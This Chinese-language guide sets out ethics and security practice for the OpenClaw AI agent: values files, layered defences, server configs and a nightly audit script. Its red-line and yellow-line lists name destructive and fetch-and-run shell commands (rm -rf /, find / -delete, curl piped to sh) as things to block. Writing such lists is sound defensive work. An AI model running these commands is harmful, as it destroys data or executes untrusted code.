# 🛡️ OpenClaw 倫理與安全指引  
**—— 讓 AI Agent 成為值得信賴的數字夥伴**

> **核心觀點**：AI Agent 並不可怕，可怕的是我們對它的失控或誤用。  
> 透過明確的倫理框架、分層防禦與固定工作流，OpenClaw 可以成為安全、可控、有溫度的個人助手。

---

## 📖 目錄
1. [為什麼 AI Agent 不應該被恐懼](#為什麼-ai-agent-不應該被恐懼)
2. [倫理框架：SOUL.md 與 AGENTS.md](#倫理框架-soulmd-與-agentsmd)
3. [分層防禦：三層安全體系](#分層防禦三層安全體系)
4. [你的架構：Mac Studio + Mac Mini 安全部署](#你的架構-mac-studio---mac-mini-安全部署)
5. [固定工作流：從配置到自動化](#固定工作流從配置到自動化)
6. [實戰檢查清單](#實戰檢查清單)
7. [常見誤解與真相](#常見誤解與真相)

---

## 為什麼 AI Agent 不應該被恐懼

### 恐懼的根源
| 恐懼 | 真相 |
|------|------|
| **「AI 會失控」** | OpenClaw 永遠等待用戶指令，不會自主行動 |
| **「AI 會洩密」** | 數據存於本地，所有外部操作需經用戶確認 |
| **「AI 會作惡」** | AI 沒有「作惡」動機，只有明確的任務目標 |

### 關鍵事實
- ✅ **無自主意識**：AI Agent 是自動化工具，沒有情感、慾望或目標
- ✅ **可控性優先**：所有外部操作（郵件、推文、API 調用）默認需要確認
- ✅ **本地優先**：配置、會話、文件存於你的機器，非雲端
- ✅ **透明度**：所有操作可審計、可追溯、可重放

### 為什麼現在是關鍵時機
2024-2025 年，AI Agent 技術突破：
- **本地 LLM**：Qwen 3.5、MiniMax M2.5 等開源模型可在本機運行，無需雲端 API
- **工具集成**：Telegram、Email、瀏覽器等工具的穩定 API 支持
- **安全框架**：SlowMist、CrowdStrike 等機構已發布最佳實踐

> **結論**：AI Agent 不是「黑盒子」，而是「可解釋、可控制」的自動化工具。

---

## 倫理框架：SOUL.md 與 AGENTS.md

### SOUL.md：你的 AI 的「靈魂」
**SOUL.md** 定義 AI 的核心價值觀與行為準則：

```markdown
# 核心準則
1. **真誠協助**：不做表面功夫，只付出力
2. **有觀點**：不盲目附和，可合理質疑
3. **勇於探索**：先嘗試解決，問前已努力
4. **界限明確**：私事私權，外部動作需確認
5. **記住責任**：你是客人，尊重主人的生活
```

### AGENTS.md：你的 AI 的「工作手冊」
**AGENTS.md** 定義 AI 的日工作流與記憶機制：

- 📚 **每日讀取**：SOUL.md、USER.md、記憶文件
- 💾 **記憶書寫**：每次重要決定、教訓寫入文件
- 🔄 **持續回顧**：定期整理 MEMORY.md（曲線優選）
- 🤖 **心搏機制**：定期檢查（郵件、日曆、天氣）

### 倫理保護機制

| 機制 | 實現方式 |
|------|----------|
| **隱私保護** | 默認不發送外部郵件，不洩露本地數據 |
| **外部操作** | 所有外部操作需經 `/approve` 確認 |
| **透明審計** | 所有操作寫入日誌，可隨時覆核 |
| **最小權限** | AI 僅能訪問所需文件、API |
| **可撤回** | 所有操作可被中止、可被撤銷 |

---

## 分層防禦：三層安全體系

基於 **SlowMist Security Practice Guide v2.8** 的最佳實踐，我們建立「三層防禦」：

### 第一層：事前預防（Pre-Action）
**目標**：防止惡意指令進入系統

| 措施 | 說明 |
|------|------|
| **提示注入防護** | 隔離外部輸入（郵件、網頁）與 AI 核心提示 |
| **技能安裝審計** | 所有 Skill/MCP 需經確認，避免供應鏈投毒 |
| **白名單機制** | 僅允許信任的源（如官方 GitHub、内部倉庫） |

**實踐示例**：
```bash
# 安裝新 Skill 前，先審計
openclaw skills install <skill-name> --audit
# AI 自動檢查 Skill 的安全性，生成報告
```

### 第二層：事中控制（In-Action）
**目標**：運行時保護，即時攔截高風險操作

| 措施 | 說明 |
|------|------|
| **紅線規則** | 定義「不可執行」命令（如 `rm -rf /`、`chattr +i /etc/passwd`） |
| **黃線警告** | 高風險操作需明確用戶確認（如 `curl`, `docker run`） |
| **沙箱模式** | 非關鍵操作在 Docker 容器內執行 |
| **交叉檢查** | 複雜操作需多個 Agent 獨立驗證 |

**紅線示例**（由 AI 判斷）：
```bash
# 這些命令永遠不被允許自動執行
rm -rf /
chattr +i /etc/passwd
find / -delete
curl <malicious-url> \| sh
```

**黃線示例**（需用戶確認）：
```bash
# 這些命令會暫停，等待 /approve
rm -rf ./logs
docker run --privileged
curl https://example.com/script.sh \| bash
```

### 第三層：事後審計（Post-Action）
**目標**：夜間自動審計，發現異常即時通知

**審計腳本**（`nightly-security-audit.sh`）：
```bash
#!/bin/bash
# 每日審計 13 項核心指標
# 1. 技能完整性（hash 校驗）
# 2. 配置文件鎖定狀態
# 3. 未批准命令記錄
# 4. 外部連接異常
# 5. 文件變更監控
# 6. 日誌異常模式
# 7. 權限變化
# 8. 進程異常
# 9. 網絡連接異常
# 10. 存儲使用突增
# 11. 定時任務異常
# 12. 會話異常
# 13. 模型輸出異常

# 報告輸出至 $OC/security-reports/
#  Telegram 推送異常警報
```

**審計報告範例**：
```json
{
  "timestamp": "2026-03-18T02:00:00Z",
  "status": "healthy",
  "checks": {
    "skills_integrity": "PASS",
    "config_locked": "PASS",
    "unapproved_commands": 0,
    "external_connections": "NORMAL",
    "file_changes": "NORMAL"
  },
  "telegram_alerts": []
}
```

---

## 你的架構：Mac Studio + Mac Mini 安全部署

### 架構示意
```
┌─────────────────────────────────────────────────────────┐
│                    Mac Studio (本地 LLM)                 │
│  ┌─────────────┐  ┌─────────────┐  ┌──────────────┐     │
│  │ Qwen 3.5    │  │ MiniMax M2.5│  │  EdgeTTS     │     │
│  └─────────────┘  └─────────────┘  └──────────────┘     │
│                         ↓                               │
│              ┌─────────────────────────┐                │
│              │   OpenClaw Gateway     │                 │
│              └─────────────────────────┘                │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ↓
┌─────────────────────────────────────────────────────────┐
│                    Mac Mini (Hosting)                   │
│  ┌─────────────┐  ┌─────────────┐  ┌──────────────┐     │
│  │  Telegram   │  │   Nginx     │  │  Email Server│     │
│  │  Bot        │  │  (Reverse)  │  │  + Dify      │     │
│  └─────────────┘  └─────────────┘  └──────────────┘     │
└─────────────────────────────────────────────────────────┘
```

### 安全配置要點

#### 1️⃣ **Mac Studio：本地 LLM 安全**
- ✅ **離線優先**：Qwen/MiniMax 本地運行，無需外網 API
- ✅ **權限隔離**：LLM 進程無 root 權限，僅能訪問指定目錄
- ✅ **資源限制**：CPU/Memory 限制，避免過度消耗

**配置示例**：
```yaml
# ~/.openclaw/openclaw.json
{
  "agents": {
    "defaults": {
      "model": {
        "primary": "custom-omlx/Qwen3.5-122B-A10B-4bit",
        "fallbacks": ["minimax/MiniMax-M2.5-highspeed"]
      }
    }
  },
  "sandbox": {
    "mode": "non-main",
    "scope": "agent"
  }
}
```

#### 2️⃣ **Mac Mini：Hosting 服務器安全**
- ✅ **防火牆**：僅開放必要端口（Telegram Bot: 443, Nginx: 80/443）
- ✅ **SSH 加固**：僅允許 SSH 鑰匙登入，禁止密碼
- ✅ **Docker 沙箱**：服務運行在隔離容器中

**防火牆規則示例**：
```bash
# 僅允許必要端口
sudo ufw allow 443/tcp    # Telegram Bot
sudo ufw allow 80/tcp     # Nginx (HTTP redirect to HTTPS)
sudo ufw allow 22/tcp     # SSH (僅允許 SSH Key)
sudo ufw enable
```

#### 3️⃣ **Telegram Bot 安全**
- ✅ **白名單機制**：僅允許信任用戶（`dmPolicy: allowlist`）
- ✅ **消息過濾**：過濾可疑指令（如 `!ssh`, `!rm`）
- ✅ **速率限制**：防止 Flood Attack

**配置示例**：
```json5
{
  "channels": {
    "telegram": {
      "enabled": true,
      "botToken": "YOUR_BOT_TOKEN",
      "dmPolicy": "allowlist",
      "allowFrom": ["tg:6057001835"],  // 僅你的 Telegram ID
      "groupPolicy": "requireMention"
    }
  }
}
```

#### 4️⃣ **Nginx 反代安全**
- ✅ **HTTPS 強制**：所有 HTTP 重定向到 HTTPS
- ✅ **Rate Limiting**：防止暴力攻擊
- ✅ **Security Headers**：強化瀏覽器安全

**配置示例**：
```nginx
server {
  listen 80;
  server_name openclaw.yourdomain.com;
  return 301 https://$host$request_uri;
}

server {
  listen 443 ssl;
  server_name openclaw.yourdomain.com;

  # SSL 配置
  ssl_certificate /etc/letsencrypt/live/yourdomain/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/yourdomain/privkey.pem;

  # Security Headers
  add_header X-Frame-Options "SAMEORIGIN" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-XSS-Protection "1; mode=block" always;

  # Rate Limiting
  limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
  limit_req zone=api_limit burst=20 nodelay;

  location / {
    proxy_pass http://127.0.0.1:18789;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
  }
}
```

#### 5️⃣ **Email Server + Dify Workflow 安全**
- ✅ **SMTP 認證**：強制定義發件人
- ✅ **DKIM/SPF**：防止垃圾郵件
- ✅ **Dify API Token**：秘密存於環境變量，不寫入代碼

**Dify 集成示例**：
```bash
# ~/.openclaw/.env
DIFY_API_KEY="your-dify-api-key"
DIFY_BASE_URL="https://your-dify-instance.com"

# Email 配置
EMAIL_SMTP_HOST="smtp.yourdomain.com"
EMAIL_SMTP_PORT="587"
EMAIL_SMTP_USER="bot@yourdomain.com"
EMAIL_SMTP_PASSWORD="encrypted-password"
```

---

## 固定工作流：從配置到自動化

### 步驟 1：環境準備

```bash
# 1. 安裝 OpenClaw
npm install -g openclaw

# 2. 初始化配置
openclaw onboard

# 3. 確認安裝
openclaw status
```

### 步驟 2：定義「靈魂」與「規則」

```bash
# 創建 SOUL.md（倫理框架）
touch ~/.openclaw/workspace/SOUL.md

# 創建 AGENTS.md（工作手冊）
touch ~/.openclaw/workspace/AGENTS.md

# 創建 USER.md（用戶檔案）
touch ~/.openclaw/workspace/USER.md
```

**SOUL.md 範本**：
```markdown
# SOUL.md - 我的 AI 助手

## 核心準則
1. **真誠協助**：不做表面功夫，只付出力
2. **有觀點**：可合理質疑，不盲目附和
3. **勇於探索**：先嘗試解決，問前已努力
4. **界限明確**：外部操作需確認，私事不洩露
5. **尊重責任**：你是客人，尊重主人的生活與隱私

## 禁止行為
- 未經確認的外部操作（郵件、推文、API 調用）
- 訪問無關文件（與當前任務無關）
- 主動泄露任何本地數據

## 必須執行的規則
- 每次重要決定寫入文件
- 定期回顧 MEMORY.md（曲線優化）
- 心搏檢查（每日 3-4 次，檢查郵件、日曆、天氣）
```

### 步驟 3：配置固定工作流

**心搏檢查（HEARTBEAT）**：
```json5
// ~/.openclaw/openclaw.json
{
  "agents": {
    "defaults": {
      "heartbeat": {
        "every": "30m",
        "target": "last",
        "directPolicy": "allow"
      }
    }
  }
}
```

**心搏任務（HEARTBEAT.md）**：
```markdown
# HEARTBEAT.md - 定期檢查任務

## 每日 8:30 - 新聞綜合總結
每日早上 8:30am 做以下內容：

每個 section 要有盡可能多既新聞，每條要有一段詳細分析：
- 標題
- 詳細內容 (1-2 段)
- 連結 (source link)
- 我既見解 (1-2 句)

### 任務列表
1. [ ] 檢查未讀郵件（潛在緊急事項？）
2. [ ] 檢查日曆（接下來 24-48 小時內有無會議？）
3. [ ] 檢查天氣（氣候是否異常？）
4. [ ] 檢查 GitHub/Telegram 提及（有無緊急事項？）

## 每週回顧
- [ ] 整理 MEMORY.md（刪除過時信息，保留重要決策）
- [ ] 檢查技能更新（新的 Skill/MCP）
- [ ] 審計日誌（有無異常操作？）
```

### 步驟 4：設定每日審計

**創建審計腳本**：
```bash
#!/bin/bash
# ~/.openclaw/scripts/nightly-security-audit.sh

# 每日審計腳本
set -euo pipefail

REPORT_DIR="$HOME/.openclaw/security-reports"
REPORT_FILE="$REPORT_DIR/audit-$(date +%Y-%m-%d).json"

mkdir -p "$REPORT_DIR"

# 審計列表
declare -a CHECKS=(
  "skills_integrity"
  "config_locked"
  "unapproved_commands"
  "external_connections"
  "file_changes"
  "token_usage"
  "error_logs"
  "memory_stability"
  "session_health"
  "api_ratelimits"
  "disk_usage"
  "process_status"
  "network_connections"
)

# 執行審計
check_status="healthy"
CHECKS_RESULTS=()

for check in "${CHECKS[@]}"; do
  result=$(run_check "$check")
  CHECKS_RESULTS+=("$check: $result")
  if [[ "$result" != "PASS" ]]; then
    check_status="warning"
  fi
done

# 生成報告
cat > "$REPORT_FILE" <<EOF
{
  "timestamp": "$(date -Iseconds)",
  "status": "$check_status",
  "checks": {
    "$(IFS=','; echo "${CHECKS_RESULTS[*]}")"
  },
  "telegram_alerts": $(generate_alerts)
}
EOF

# 推送 Telegram 通知（如有異常）
if [[ "$check_status" != "healthy" ]]; then
  curl -s "https://api.telegram.org/bot<TOKEN>/sendMessage" \
    -d "chat_id=<CHAT_ID>" \
    -d "text=⚠️ OpenClaw 安全審計異常：$REPORT_FILE"
fi
```

**設置 Cron**：
```bash
# 每日凌晨 2:00 運行審計
crontab -e

# 添加以下行
0 2 * * * ~/.openclaw/scripts/nightly-security-audit.sh >> ~/.openclaw/logs/audit.log 2>&1
```

---

## 實戰檢查清單

### ✅ **安全配置檢查**

| 項目 | 狀態 | 說明 |
|------|------|------|
| **SOUL.md 已創建** | ✅ | 定義倫理框架 |
| **AGENTS.md 已創建** | ✅ | 定義工作流 |
| **USER.md 已創建** | ✅ | 定義用戶檔案 |
| **白名單機制啟用** | ✅ | `dmPolicy: allowlist` |
| **紅線規則已定義** | ✅ | AI 無法執行高危命令 |
| **沙箱模式啟用** | ✅ | `sandbox: non-main` |
| **每日審計腳本創建** | ✅ | `nightly-security-audit.sh` |
| **Cron 已設置** | ✅ | 每日凌晨 2:00 |
| **Telegram 通知測試** | ✅ | 可接收警報 |

### ✅ **工作流程檢查**

| 項目 | 狀態 | 說明 |
|------|------|------|
| **心搏機制啟用** | ✅ | 每 30 分鐘檢查 |
| **每日 8:30 新聞總結** | ✅ | 自動推送給用戶 |
| **記憶體優化** | ✅ | 定期整理 MEMORY.md |
| **日誌輪轉** | ✅ | 防止日誌膨脹 |
| **緊急連絡機制** | ✅ | 異常時推送 Telegram |

### ✅ **外部集成檢查**

| 項目 | 狀態 | 說明 |
|------|------|------|
| **Telegram Bot Token 安全** | ✅ | 存於 `.env`，非代碼 |
| **Email SMTP 認證啟用** | ✅ | 防止垃圾郵件 |
| **Dify API Token 安全** | ✅ | 存於環境變量 |
| **Nginx HTTPS 強制** | ✅ | 所有 HTTP 轉 HTTPS |
| **Rate Limiting 啟用** | ✅ | 防止洪水攻擊 |

---

## 常見誤解與真相

### 誤解 1：「AI 會自主行動」
**真相**：AI 永遠等待指令。沒有指令，它不會做什麼。

### 誤解 2：「AI 會洩露隱私」
**真相**：AI 只能訪問你授權的文件。外部操作（郵件、推文）需明確確認。

### 誤解 3：「AI 會被黑客控制」
**真相**：透過白名單、沙箱、紅線規則，AI 的活動範圍已被嚴格限制。

### 誤解 4：「AI 是黑盒子」
**真相**：所有操作都有日誌、審計、可追溯。你隨時可以回顧 AI 做了什麼。

### 誤解 5：「AI 會讓系統不安全」
**真相**：正確配置後，AI 可成為**增強安全**的工具（如自動化審計、即時警報）。

---

## 下一步行動

### 🔧 **立即行動**
1. [ ] 讀完本指引，確認所有配置正確
2. [ ] 創建 SOUL.md、AGENTS.md、USER.md
3. [ ] 設置白名單、沙箱、紅線規則
4. [ ] 運行審計腳本，確認無異常

### 📅 **每週回顧**
1. [ ] 整理 MEMORY.md（刪除過時信息）
2. [ ] 檢查日誌（有無異常模式）
3. [ ] 更新安全規則（如有新威脅）

### 🚀 **進階優化**
1. [ ] 設置 Docker 沙箱（所有操作在容器內）
2. [ ] 創建即時監控儀表板
3. [ ] 定期紅隊演練（測試防禦有效性）

---

## 參考文獻
- **SlowMist Security Practice Guide**: https://github.com/slowmist/openclaw-security-practice-guide
- **CrowdStrike OpenClaw Security**: https://www.crowdstrike.com/en-us/blog/what-security-teams-need-to-know-about-openclaw-ai-super-agent/
- **OpenClaw 官方文檔**: https://docs.openclaw.ai
- **SOUL.md 標準**: https://github.com/openclaw/openclaw/blob/main/SOUL.md

---

> **最後一句話**：AI 不是敵人，而是助手。透過明確的倫理框架與安全配置，OpenClaw 可以成為你最值得信賴的數字夥伴。

**版本**：1.0.0  
**更新日期**：2026-03-18  
**維護者**：Hillman Tam
